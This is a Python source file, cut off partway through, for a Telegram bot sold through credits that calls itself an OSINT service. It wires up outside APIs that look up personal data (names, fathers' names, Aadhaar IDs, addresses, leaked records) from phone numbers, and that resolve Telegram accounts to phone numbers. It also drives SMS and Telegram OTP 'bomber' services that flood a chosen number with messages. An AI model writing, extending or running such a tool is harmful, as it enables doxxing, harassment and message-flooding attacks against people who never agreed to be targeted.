import os
import asyncio
import aiohttp
import sqlite3
import threading
import time
import random
import json
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile
)
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   KeyboardButtonStyle - Primary Colors
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try:
    from aiogram.types import KeyboardButtonStyle
except ImportError:
    class KeyboardButtonStyle:
        PRIMARY = "primary"
        DANGER = "danger"
        SUCCESS = "success"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   PM - Parse Mode
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PM = "HTML"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   PREMIUM EMOJI PLACEHOLDERS (USER CONFIGURABLE)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PREMIUM_EMOJI_GIVE = "[PREMIUM_EMOJI_GIVE]"
PREMIUM_EMOJI_TAKE = "[PREMIUM_EMOJI_TAKE]"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   FONT HELPERS - Small Caps
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def to_small_caps(text: str) -> str:
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ',
        'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ',
        'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
        'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ',
        'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ',
        'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
        'Y': 'ʏ', 'Z': 'ᴢ'
    }
    result = ""
    for ch in text:
        if ch in small_caps_map:
            result += small_caps_map[ch]
        else:
            result += ch
    return result

def bq(text: str) -> str:
    """Render compact bot messages as a consistent premium card."""
    from html import escape
    return f'<blockquote>{escape(text, quote=False)}</blockquote>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#       GLOBAL MESSAGE UI / PREMIUM CARD
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
UI_TOP = '<tg-emoji emoji-id="5467641505525016018">➿</tg-emoji>' * 11
UI_BOTTOM = '<tg-emoji emoji-id="5467641505525016018">➿</tg-emoji>' * 11
UI_FOOTER = (
    '<tg-emoji emoji-id="5355051922862653659">🤖</tg-emoji> '
    '<b>ᴘᴏᴡᴇʀᴇᴅ ʙʏ</b>  •  '
    '<tg-emoji emoji-id="6118385795976930086">🌟</tg-emoji> ᴘʀᴇᴍɪᴜᴍ sᴇʀᴠɪᴄᴇ'
)

def premium_card(text: str) -> str:
    """Add UI only to plain outgoing text; preserve existing custom cards."""
    if not isinstance(text, str) or not text.strip():
        return text
    if '<blockquote' in text or '<tg-emoji' in text:
        return text
    return (
        '<blockquote>'
        f'{UI_TOP}\n'
        f'{text.strip()}\n'
        f'{UI_BOTTOM}\n'
        f'{UI_FOOTER}'
        '</blockquote>'
    )

# Patch outgoing methods once so every plain bot message gets the same UI.
_original_message_answer = Message.answer
_original_bot_send_message = Bot.send_message
_original_bot_send_photo = Bot.send_photo
_original_bot_send_video = Bot.send_video

async def _ui_message_answer(self, text=None, *args, **kwargs):
    if text is not None:
        text = premium_card(text)
    return await _original_message_answer(self, text, *args, **kwargs)

async def _ui_bot_send_message(self, chat_id, text, *args, **kwargs):
    return await _original_bot_send_message(self, chat_id, premium_card(text), *args, **kwargs)

async def _ui_bot_send_photo(self, chat_id, photo, *args, **kwargs):
    if kwargs.get('caption') is not None:
        kwargs['caption'] = premium_card(kwargs['caption'])
    return await _original_bot_send_photo(self, chat_id, photo, *args, **kwargs)

async def _ui_bot_send_video(self, chat_id, video, *args, **kwargs):
    if kwargs.get('caption') is not None:
        kwargs['caption'] = premium_card(kwargs['caption'])
    return await _original_bot_send_video(self, chat_id, video, *args, **kwargs)

Message.answer = _ui_message_answer
Bot.send_message = _ui_bot_send_message
Bot.send_photo = _ui_bot_send_photo
Bot.send_video = _ui_bot_send_video

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN secret is not configured.")
OWNER_ID      = 8137776838
DEFAULT_ADMINS = [8137776838, 8790645158]
GET_INFO_API  = "https://storage-deutschland-don-patterns.trycloudflare.com/num"
GET_INFO_KEY = os.environ.get("GET_INFO_KEY", "")
GET_INFO_COST = 1
BLAST_COST    = 1
NEW_USER_CREDITS = 2
REFER_CREDITS = 1
BLAST_DURATION = 300
LEAK_API_URL = "https://api-wd7m.onrender.com/api"
LEAK_API_KEY = os.environ.get("LEAK_API_KEY", "")
LEAK_COST = 2
LOGS_CHANNEL = -1004299299457
CUSTOM_BOMBER_COST = 1

# TG TO NUM API
TG_TO_NUM_API = "https://user-to-num-info-d57b.onrender.com/api/developer/Cyb3rB4nn3r/fast"
TG_TO_NUM_KEY = os.environ.get("TG_TO_NUM_KEY", "")
TG_TO_NUM_COST = 1

# BOMBER API
BOMBER_API = "https://erenhu-production.up.railway.app/bom"
BOMBER_KEY = os.environ.get("BOMBER_KEY", "")
BOMBER_INTERVAL = 7
BOMBER_DURATION_NORMAL = 600
BOMBER_DURATION_PREMIUM = 3600

# Custom Bomber API
CUSTOM_BOMBER_API = "https://custome-sms-bomber.noobster.workers.dev/send"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🆕 TG BOMBER API CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TG_BOMBER_API   = "https://immortaltgb0mb3rs.vercel.app/send-otp"
TG_BOMBER_KEY = os.environ.get("TG_BOMBER_KEY", "")
TG_BOMBER_COUNT = 10
TG_BOMBER_COST  = 5

# Premium Emoji IDs
EMOJI_GET_INFO = "6294071751047385584"
EMOJI_PROFILE = "5373012449597335010"
EMOJI_REFER = "6071278787947925866"
EMOJI_SPIN = "6224354098141997587"
EMOJI_BOMBER = "6091259302226437503"
EMOJI_REDEEM = "5462902520215002477"
EMOJI_LEAK = "6292090482633738269"
EMOJI_TG_TO_NUM = "5330237710655306682"
EMOJI_TG_BOMBER_BTN = "4958593954309211065"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PREMIUM EMOJI IDs
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EMOJI_INFO_HEADER = "6267256822814480365"
EMOJI_NUMBER = "6026092115631543342"
EMOJI_MOBILE = "6026092115631543342"
EMOJI_NAME = "5425124408786197150"
EMOJI_FATHER = "5258513401784573443"
EMOJI_AADHAAR = "5985796637971191405"
EMOJI_ADDRESS = "4958485609464202497"
EMOJI_CIRCLE = "5895476993314524652"
EMOJI_EMAIL = "5422736570178371979"
EMOJI_ALT_MOBILE = "6203911118964924015"

EMOJI_PROFILE_NAME = "5330237710655306682"
EMOJI_PROFILE_ID = "5985796637971191405"
EMOJI_PROFILE_USERNAME = "6152070322536320811"
EMOJI_PROFILE_CREDITS = "6267068789146260253"
EMOJI_PROFILE_STATUS = "6224354098141997587"
EMOJI_PROFILE_REFERRALS = "6267115986541877538"
EMOJI_PROFILE_JOINED = "6293844173615272835"

EMOJI_REFER_HEADER = "5188481279963715781"
EMOJI_REFER_EARN = "6332317438385854752"
EMOJI_REFER_COUNT = "5372926953978341366"
EMOJI_REFER_CREDITS = "5422694848866061927"
EMOJI_REFER_LINK = "6071278787947925866"

EMOJI_BOMBER_HEADER = "5469654973308476699"
EMOJI_BOMBER_CREDITS = "5326049357332513437"
EMOJI_BOMBER_COST = "6332169270604077580"
EMOJI_BOMBER_SEND = "6267219374994626613"

EMOJI_BLAST_HEADER = "5469654973308476699"
EMOJI_BLAST_NUMBER = "6026092115631543342"
EMOJI_BLAST_ROUND = "6203911118964924015"
EMOJI_BLAST_DURATION = "6294201832721881128"
EMOJI_BLAST_PROCESSING = "5422568121561020434"

EMOJI_GIVE_CHECK = "6080263490163973583"
EMOJI_GIVE_USER = "5373012449597335010"
EMOJI_GIVE_UID = "5888781182249738113"
EMOJI_GIVE_CREDITS = "6267068789146260253"
EMOJI_GIVE_TOTAL = "6098204676660928162"
EMOJI_GIVE_BOT = "5355051922862653659"
EMOJI_GIVE_STAR = "6118385795976930086"
EMOJI_ORANGE_LINE = "5467641505525016018"
EMOJI_BAN = "6071022434234930063"
EMOJI_BANNED = "6264989883241076562"
EMOJI_UNBAN = "6266967801580231067"
EMOJI_INVALID = "6267237615720731788"
EMOJI_SECURED = "6267039884016358504"
EMOJI_UNSECURED = "6266967801580231067"

EMOJI_WELCOME_LEAK = "6292090482633738269"
EMOJI_WELCOME_WAVE = "5406610501285204375"
EMOJI_WELCOME_CREDITS = "6057415823222379852"
EMOJI_WELCOME_DOWN = "5472250091332993630"

EMOJI_PHONE = "5193178118759660952"
EMOJI_ORANGE_LINE_PREMIUM = "5467641505525016018"
EMOJI_MOBILE_PREMIUM = "5406809207947142040"
EMOJI_BELL_PREMIUM = "6131909286487399523"
EMOJI_BRICK_PREMIUM = "5326049357332513437"
EMOJI_GIFT_PREMIUM = "5296645049151417006"
EMOJI_BOT_PREMIUM = "5355051922862653659"
EMOJI_STAR_PREMIUM = "6118385795976930086"
EMOJI_LEAK_PREMIUM = "6292090482633738269"
EMOJI_DESCRIPTION = "6285048454255220485"
EMOJI_RECORDS = "6285240160120477644"
EMOJI_ADDRESS_PREMIUM = "4958485609464202497"
EMOJI_CHECK = "6267225207560214192"
EMOJI_PHONE_PREMIUM = "6282996898701775483"
EMOJI_PROCESSING = "6294201832721881128"

EMOJI_TG_COMET = "6294209052561904765"
EMOJI_TG_ORANGE_LINE = "5467641505525016018"
EMOJI_TG_STAR = "5289934755456889065"
EMOJI_TG_INDIA = "5222300011366200403"
EMOJI_TG_BOT = "5355051922862653659"
EMOJI_TG_STAR2 = "6118385795976930086"

# 🆕 TG BOMBER MESSAGE EMOJI IDs
EMOJI_TGB_CHECK_HEAD = "6082220174184811414"   # ✔️
EMOJI_TGB_LINE = "5467641505525016018"         # ➿
EMOJI_TGB_BEAR = "6082475037544156371"         # 🐻
EMOJI_TGB_SMILE = "6100515480735321747"        # 😄
EMOJI_TGB_APPLE = "6269463714450117067"        # 🍏
EMOJI_TGB_CHECK_GREEN = "6269315778596573375"  # ✅
EMOJI_TGB_DIAMOND = "6129410405795110009"      # 💎
EMOJI_TGB_BOT = "5355051922862653659"          # 🤖
EMOJI_TGB_STAR = "6118385795976930086"         # 🌟

EMOJI_TGB_SUCCESS_TOP = "6294325742528369614"  # ✅ (top)
EMOJI_TGB_SUCCESS_CHECK = "6071022434234930063" # ✅ (success)
EMOJI_TGB_CRY = "6070901633984762639"          # 😭
EMOJI_TGB_SAD = "6104880305674393723"          # 😞

# CUSTOM BOMBER EMOJI IDs
CUSTOM_EMOJI_LINE = "5465144557568010803"
CUSTOM_EMOJI_SAD = "6291830856155666178"
CUSTOM_EMOJI_SKULL = "5370559086968454374"
CUSTOM_EMOJI_MEGAPHONE = "6129433877791382400"
CUSTOM_EMOJI_GIFT = "5422573279816747511"
CUSTOM_EMOJI_PHONE = "5453965363286925977"
CUSTOM_EMOJI_CHAT = "5303138782004924588"
CUSTOM_EMOJI_WINK = "6129903231817488942"
CUSTOM_EMOJI_COMET = "6224354098141997587"
CUSTOM_EMOJI_LIGHTNING = "6264907690451932671"
CUSTOM_EMOJI_TURTLE = "5350813992732338949"
CUSTOM_EMOJI_CHECK = "6120898777046847624"
CUSTOM_EMOJI_TICK = "6080263490163973583"
CUSTOM_EMOJI_CRY = "6070901633984762639"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              DATABASE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
conn = sqlite3.connect("osintbot.db", check_same_thread=False)
cur = conn.cursor()
db_lock = threading.Lock()  # FIX: prevents race conditions across async handlers

# FIX: single shared aiohttp session — created in main(), avoids per-request leak
http_session: aiohttp.ClientSession = None

def init_db():
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id     INTEGER PRIMARY KEY,
            username    TEXT,
            full_name   TEXT,
            credits     INTEGER DEFAULT 0,
            referrer_id INTEGER DEFAULT NULL,
            refer_count INTEGER DEFAULT 0,
            last_spin   INTEGER DEFAULT 0,
            joined_at   INTEGER DEFAULT 0,
            premium_until INTEGER DEFAULT 0,
            banned      INTEGER DEFAULT 0
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS redeem_codes (
            code        TEXT PRIMARY KEY,
            credits     INTEGER DEFAULT 0,
            max_uses    INTEGER DEFAULT 1,
            used_count  INTEGER DEFAULT 0,
            created_by  INTEGER DEFAULT 0,
            created_at  INTEGER DEFAULT 0
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS redeem_usage (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            code        TEXT,
            user_id     INTEGER,
            used_at     INTEGER DEFAULT 0,
            FOREIGN KEY (code) REFERENCES redeem_codes(code)
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS secured_numbers (
            number      TEXT PRIMARY KEY,
            secured_by  INTEGER DEFAULT 0,
            secured_at  INTEGER DEFAULT 0
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS secured_users (
            user_id     INTEGER PRIMARY KEY,
            secured_by  INTEGER DEFAULT 0,
            secured_at  INTEGER DEFAULT 0
        )
    """)
    conn.commit()

def db_get(key, default=""):
    cur.execute("SELECT value FROM settings WHERE key=?", (key,))
    r = cur.fetchone()
    return r[0] if r else default

def db_set(key, value):
    with db_lock:
        cur.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (key, str(value)))
        conn.commit()

def user_exists(uid):
    cur.execute("SELECT 1 FROM users WHERE user_id=?", (uid,))
    return cur.fetchone() is not None

def add_user(uid, username, full_name, referrer_id=None):
    now = int(time.time())
    with db_lock:
        cur.execute("""
            INSERT OR IGNORE INTO users
            (user_id, username, full_name, credits, referrer_id, refer_count, joined_at, premium_until, banned)
            VALUES (?,?,?,?,?,0,?,0,0)
        """, (uid, username or "", full_name or "", NEW_USER_CREDITS, referrer_id, now))
        conn.commit()
        if referrer_id and referrer_id != uid and user_exists(referrer_id):
            cur.execute(
                "UPDATE users SET credits=credits+?, refer_count=refer_count+1 WHERE user_id=?",
                (REFER_CREDITS, referrer_id)
            )
            conn.commit()

def get_user(uid):
    cur.execute("SELECT * FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone()
    if not r:
        return None
    keys = ["user_id","username","full_name","credits",
            "referrer_id","refer_count","last_spin","joined_at","premium_until","banned"]
    return dict(zip(keys, r))

def is_premium(uid):
    u = get_user(uid)
    if not u:
        return False
    if u["premium_until"] == 0:
        return False
    return u["premium_until"] > int(time.time())

def add_credits(uid, amount):
    with db_lock:
        cur.execute("UPDATE users SET credits=credits+? WHERE user_id=?", (amount, uid))
        conn.commit()

def deduct_credits(uid, amount):
    with db_lock:
        cur.execute("UPDATE users SET credits=credits-? WHERE user_id=?", (amount, uid))
        conn.commit()

def set_last_spin(uid, ts):
    with db_lock:
        cur.execute("UPDATE users SET last_spin=? WHERE user_id=?", (ts, uid))
        conn.commit()

def total_users():
    cur.execute("SELECT COUNT(*) FROM users")
    return cur.fetchone()[0]

def get_all_admins():
    extra = db_get("extra_admins", "")
    ids = [OWNER_ID, *DEFAULT_ADMINS]
    for x in extra.split(","):
        x = x.strip()
        if x.isdigit():
            ids.append(int(x))
    return list(set(ids))

def is_admin(uid):
    return uid in get_all_admins()

def is_owner(uid):
    return uid == OWNER_ID

def set_premium(uid, days):
    until = int(time.time()) + (days * 86400)
    with db_lock:
        cur.execute("UPDATE users SET premium_until=? WHERE user_id=?", (until, uid))
        conn.commit()

def remove_premium(uid):
    with db_lock:
        cur.execute("UPDATE users SET premium_until=0 WHERE user_id=?", (uid,))
        conn.commit()

def is_banned(uid):
    u = get_user(uid)
    if not u:
        return False
    return u["banned"] == 1

def ban_user(uid):
    with db_lock:
        cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (uid,))
        conn.commit()

def unban_user(uid):
    with db_lock:
        cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (uid,))
        conn.commit()

def is_number_secured(number):
    cur.execute("SELECT 1 FROM secured_numbers WHERE number=?", (number,))
    return cur.fetchone() is not None

def secure_number(number, admin_id):
    with db_lock:
        cur.execute("INSERT OR REPLACE INTO secured_numbers (number, secured_by, secured_at) VALUES (?, ?, ?)",
                    (number, admin_id, int(time.time())))
        conn.commit()

def unsecure_number(number):
    with db_lock:
        cur.execute("DELETE FROM secured_numbers WHERE number=?", (number,))
        conn.commit()

def is_user_secured(user_id):
    cur.execute("SELECT 1 FROM secured_users WHERE user_id=?", (user_id,))
    return cur.fetchone() is not None

def secure_user(user_id, admin_id):
    with db_lock:
        cur.execute("INSERT OR REPLACE INTO secured_users (user_id, secured_by, secured_at) VALUES (?, ?, ?)",
                    (user_id, admin_id, int(time.time())))
        conn.commit()

def unsecure_user(user_id):
    with db_lock:
        cur.execute("DELETE FROM secured_users WHERE user_id=?", (user_id,))
        conn.commit()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# REDEEM CODE FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def generate_redeem_code() -> str:
    prefix = "OSINT"
    chars = string.ascii_uppercase + string.digits
    suffix = ''.join(random.choices(chars, k=6))
    return f"{prefix}-{suffix}"

def create_redeem_code(credits: int, max_uses: int, created_by: int) -> str:
    code = generate_redeem_code()
    with db_lock:
        cur.execute("""
            INSERT OR REPLACE INTO redeem_codes (code, credits, max_uses, used_count, created_by, created_at)
            VALUES (?, ?, ?, 0, ?, ?)
        """, (code, credits, max_uses, created_by, int(time.time())))
        conn.commit()
    return code

def get_redeem_code(code: str):
    cur.execute("SELECT * FROM redeem_codes WHERE code=?", (code,))
    r = cur.fetchone()
    if not r:
        return None
    keys = ["code", "credits", "max_uses", "used_count", "created_by", "created_at"]
    return dict(zip(keys, r))

def use_redeem_code(code: str, user_id: int) -> dict:
    code_data = get_redeem_code(code)
    if not code_data:
        return {"success": False, "message": to_small_caps("Invalid redeem code")}
    
    if code_data["used_count"] >= code_data["max_uses"]:
        return {"success": False, "message": to_small_caps("Redeem code limit reached")}
    
    cur.execute("SELECT 1 FROM redeem_usage WHERE code=? AND user_id=?", (code, user_id))
    if cur.fetchone():
        return {"success": False, "message": to_small_caps("You have already used this code")}
    
    with db_lock:
        cur.execute("UPDATE redeem_codes SET used_count=used_count+1 WHERE code=?", (code,))
        cur.execute("INSERT INTO redeem_usage (code, user_id, used_at) VALUES (?, ?, ?)", 
                    (code, user_id, int(time.time())))
        conn.commit()
    
    add_credits(user_id, code_data["credits"])
    
    return {
        "success": True, 
        "message": to_small_caps(f"Redeemed successfully! You got {code_data['credits']} credits"),
        "credits": code_data["credits"]
    }

def get_all_redeem_codes():
    cur.execute("SELECT * FROM redeem_codes ORDER BY created_at DESC")
    return cur.fetchall()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              STATES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class GetInfoState(StatesGroup):
    waiting_number = State()

class BlastState(StatesGroup):
    waiting_number = State()

class LeakState(StatesGroup):
    waiting_number = State()

class TgToNumState(StatesGroup):
    waiting_userid = State()

class TgBomberState(StatesGroup):
    waiting_number = State()

class AdminState(StatesGroup):
    add_channel = State()
    remove_channel = State()
    set_media_cmd = State()
    set_media_file = State()
    remove_media_cmd = State()
    add_admin = State()
    give_credits = State()
    remove_credits = State()
    give_premium = State()
    remove_premium_state = State()
    create_redeem_credits = State()
    create_redeem_limit = State()
    broadcast_msg = State()
    secure_number_state = State()
    unsecure_number_state = State()
    secure_user_state = State()
    unsecure_user_state = State()
    ban_user = State()
    unban_user = State()

class RedeemState(StatesGroup):
    waiting_code = State()

class CustomBomberState(StatesGroup):
    waiting_number = State()
    waiting_message = State()
    waiting_count = State()
    waiting_speed = State()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   BUTTON LABELS (Small Caps)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BTN_GET_INFO = to_small_caps("Number Info")
BTN_MY_PROFILE = to_small_caps("My Profile")
BTN_REFER = to_small_caps("Refer & Earn")
BTN_SPIN = to_small_caps("Daily Spin")
BTN_BOMBER = to_small_caps("Bomber")
BTN_REDEEM = to_small_caps("Redeem Code")
BTN_LEAK = to_small_caps("Leak Osint")
BTN_TG_TO_NUM = to_small_caps("TG TO NUM")
BTN_CUSTOM_BOMBER = "Cᴏᴜsᴛᴏᴍ Bᴏᴍʙᴇʀ"
BTN_TG_BOMBER = "ᴛɢ ʙᴏᴍʙᴇʀ"

# ADMIN BUTTONS
BTN_TOTAL_USERS = to_small_caps("Total Users")
BTN_ADD_CHANNEL = to_small_caps("Add Force Channel")
BTN_REMOVE_CHANNEL = to_small_caps("Remove Force Channel")
BTN_SET_MEDIA = to_small_caps("Set Dashboard Media")
BTN_REMOVE_MEDIA = to_small_caps("Remove Dashboard Media")
BTN_ADD_CREDITS_ADMIN = to_small_caps("Add Credits")
BTN_REMOVE_CREDITS_ADMIN = to_small_caps("Remove Credits")
BTN_ADD_PREMIUM = to_small_caps("Add Premium")
BTN_REMOVE_PREMIUM = to_small_caps("Remove Premium")
BTN_ADD_ADMIN = to_small_caps("Add Admin")
BTN_CREATE_REDEEM = to_small_caps("Create Redeem")
BTN_VIEW_REDEEM = to_small_caps("View Redeem")
BTN_MAINTENANCE = to_small_caps("Maintenance Toggle")
BTN_BROADCAST = to_small_caps("Broadcast")
BTN_SECURE_NUMBER = to_small_caps("Secure Number")
BTN_UNSECURE_NUMBER = to_small_caps("Unsecure Number")
BTN_SECURE_TG = to_small_caps("Secure TG")
BTN_UNSECURE_TG = to_small_caps("Unsecure TG")
BTN_BAN_USER = to_small_caps("Ban User")
BTN_UNBAN_USER = to_small_caps("Unban User")
BTN_BACK_ADMIN = to_small_caps("Back to Main")

# 🆕 All reply-keyboard buttons — state handlers will ignore these
ALL_REPLY_BUTTONS = [
    BTN_TG_BOMBER, BTN_GET_INFO, BTN_MY_PROFILE, BTN_REFER, BTN_REDEEM,
    BTN_SPIN, BTN_BOMBER, BTN_LEAK, BTN_TG_TO_NUM, BTN_CUSTOM_BOMBER,
    BTN_TOTAL_USERS, BTN_ADD_CHANNEL, BTN_REMOVE_CHANNEL, BTN_SET_MEDIA,
    BTN_REMOVE_MEDIA, BTN_ADD_CREDITS_ADMIN, BTN_REMOVE_CREDITS_ADMIN,
    BTN_ADD_PREMIUM, BTN_REMOVE_PREMIUM, BTN_ADD_ADMIN, BTN_CREATE_REDEEM,
    BTN_VIEW_REDEEM, BTN_MAINTENANCE, BTN_BROADCAST, BTN_SECURE_NUMBER,
    BTN_UNSECURE_NUMBER, BTN_SECURE_TG, BTN_UNSECURE_TG, BTN_BAN_USER,
    BTN_UNBAN_USER, BTN_BACK_ADMIN
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              KEYBOARDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _btn(text, emoji_id=None, style=KeyboardButtonStyle.PRIMARY):
    button_data = {"text": text, "style": style}
    if emoji_id:
        button_data["icon_custom_emoji_id"] = emoji_id
    try:
        return KeyboardButton(**button_data)
    except Exception:
        try:
            return KeyboardButton(text=text, style=style)
        except Exception:
            return KeyboardButton(text=text)

def main_kb():
    keyboard = [
        # 🆕 TG BOMBER — FIRST OPTION (Red / DANGER)
        [
            _btn(BTN_TG_BOMBER, EMOJI_TG_BOMBER_BTN, KeyboardButtonStyle.DANGER),
        ],
        [
            _btn(BTN_GET_INFO, EMOJI_GET_INFO, KeyboardButtonStyle.DANGER),
            _btn(BTN_MY_PROFILE, EMOJI_PROFILE, KeyboardButtonStyle.DANGER),
        ],
        [
            _btn(BTN_REFER, EMOJI_REFER, KeyboardButtonStyle.PRIMARY),
            _btn(BTN_REDEEM, EMOJI_REDEEM, KeyboardButtonStyle.PRIMARY),
        ],
        [
            _btn(BTN_SPIN, EMOJI_SPIN, KeyboardButtonStyle.DANGER),
            _btn(BTN_BOMBER, EMOJI_BOMBER, KeyboardButtonStyle.DANGER),
        ],
        [
            _btn(BTN_LEAK, EMOJI_LEAK, KeyboardButtonStyle.DANGER),
            _btn(BTN_TG_TO_NUM, EMOJI_TG_TO_NUM, KeyboardButtonStyle.DANGER),
        ],
        [
            _btn(BTN_CUSTOM_BOMBER, "4956290155326473271", KeyboardButtonStyle.SUCCESS),
        ],
    ]
    try:
        return ReplyKeyboardMarkup(
            keyboard=keyboard,
            resize_keyboard=True,
            is_persistent=True,
        )
    except Exception:
        return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

def admin_reply_kb():
    keyboard = [
        [KeyboardButton(text=BTN_TOTAL_USERS, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_ADD_CHANNEL, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_REMOVE_CHANNEL, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_SET_MEDIA, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_REMOVE_MEDIA, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_ADD_CREDITS_ADMIN, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_REMOVE_CREDITS_ADMIN, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_ADD_PREMIUM, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_REMOVE_PREMIUM, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_ADD_ADMIN, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_CREATE_REDEEM, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_VIEW_REDEEM, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_MAINTENANCE, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_BROADCAST, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_SECURE_NUMBER, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_UNSECURE_NUMBER, style=KeyboardButtonStyle.SUCCESS)],
